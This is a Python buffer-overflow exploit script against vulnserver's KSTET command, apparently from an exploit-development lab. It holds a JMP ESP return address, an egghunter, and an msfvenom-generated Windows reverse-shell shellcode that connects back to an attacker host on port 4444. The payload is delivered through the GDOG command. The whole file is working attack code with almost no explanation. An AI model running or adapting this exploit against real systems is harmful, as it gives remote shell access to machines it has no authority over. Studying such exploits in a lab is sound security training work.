#!/usr/bin/python

import socket

host = "172.16.24.212"  # target machine running vulnserver
port = 9999             # vulnserver port

# JMP ESP: 0x625011af
JMP_ESP = "\xaf\x11\x50\x62"      # address with JMP ESP instruction (little endian format)
JMP_BCK = "\x83\xEC\x44\xff\xe4"  # sub esp 68; jmp esp
#JMP_BCK = "\xeb\xb8"             # alternative way to jump back

# EGG: w00t - \x77\x30\x30\x74    # EGG

# Egghunter
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

# Reverse shell
#msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=172.16.24.204 LPORT=4444 -f python -b "\x00" EXITFUNC=thread
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 351 (iteration=0)
#x86/shikata_ga_nai chosen with final size 351
#Payload size: 351 bytes
#Final size of python file: 1712 bytes

buf =  b""
buf += b"\xb8\x4a\xf5\x4f\x87\xdb\xd0\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x52\x83\xc5\x04\x31\x45\x0e\x03\x0f\xfb\xad"
buf += b"\x72\x73\xeb\xb0\x7d\x8b\xec\xd4\xf4\x6e\xdd\xd4\x63"
buf += b"\xfb\x4e\xe5\xe0\xa9\x62\x8e\xa5\x59\xf0\xe2\x61\x6e"
buf += b"\xb1\x49\x54\x41\x42\xe1\xa4\xc0\xc0\xf8\xf8\x22\xf8"
buf += b"\x32\x0d\x23\x3d\x2e\xfc\x71\x96\x24\x53\x65\x93\x71"
buf += b"\x68\x0e\xef\x94\xe8\xf3\xb8\x97\xd9\xa2\xb3\xc1\xf9"
buf += b"\x45\x17\x7a\xb0\x5d\x74\x47\x0a\xd6\x4e\x33\x8d\x3e"
buf += b"\x9f\xbc\x22\x7f\x2f\x4f\x3a\xb8\x88\xb0\x49\xb0\xea"
buf += b"\x4d\x4a\x07\x90\x89\xdf\x93\x32\x59\x47\x7f\xc2\x8e"
buf += b"\x1e\xf4\xc8\x7b\x54\x52\xcd\x7a\xb9\xe9\xe9\xf7\x3c"
buf += b"\x3d\x78\x43\x1b\x99\x20\x17\x02\xb8\x8c\xf6\x3b\xda"
buf += b"\x6e\xa6\x99\x91\x83\xb3\x93\xf8\xcb\x70\x9e\x02\x0c"
buf += b"\x1f\xa9\x71\x3e\x80\x01\x1d\x72\x49\x8c\xda\x75\x60"
buf += b"\x68\x74\x88\x8b\x89\x5d\x4f\xdf\xd9\xf5\x66\x60\xb2"
buf += b"\x05\x86\xb5\x15\x55\x28\x66\xd6\x05\x88\xd6\xbe\x4f"
buf += b"\x07\x08\xde\x70\xcd\x21\x75\x8b\x86\xe1\x9a\x8b\x9a"
buf += b"\x92\x98\xab\x33\x3f\x14\x4d\x59\xaf\x70\xc6\xf6\x56"
buf += b"\xd9\x9c\x67\x96\xf7\xd9\xa8\x1c\xf4\x1e\x66\xd5\x71"
buf += b"\x0c\x1f\x15\xcc\x6e\xb6\x2a\xfa\x06\x54\xb8\x61\xd6"
buf += b"\x13\xa1\x3d\x81\x74\x17\x34\x47\x69\x0e\xee\x75\x70"
buf += b"\xd6\xc9\x3d\xaf\x2b\xd7\xbc\x22\x17\xf3\xae\xfa\x98"
buf += b"\xbf\x9a\x52\xcf\x69\x74\x15\xb9\xdb\x2e\xcf\x16\xb2"
buf += b"\xa6\x96\x54\x05\xb0\x96\xb0\xf3\x5c\x26\x6d\x42\x63"
buf += b"\x87\xf9\x42\x1c\xf5\x99\xad\xf7\xbd\xba\x4f\xdd\xcb"
buf += b"\x52\xd6\xb4\x71\x3f\xe9\x63\xb5\x46\x6a\x81\x46\xbd"
buf += b"\x72\xe0\x43\xf9\x34\x19\x3e\x92\xd0\x1d\xed\x93\xf0"

shellcode = "GDOG " + "w00tw00t" + buf 
buffer = "KSTET /.:/" + "\x90" * 20 + egghunter + (66- 20 - len(egghunter)) * "\x90" + JMP_ESP + "\x90\x90" + JMP_BCK + (5000 - 66 - len(JMP_ESP) - len(JMP_BCK) - 2) * "\x90"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[+] Sending shellcode with GDOG command"
s.send(shellcode)
print s.recv(1024)
print "[+] Sending egghunter"
s.send(buffer)
s.close()
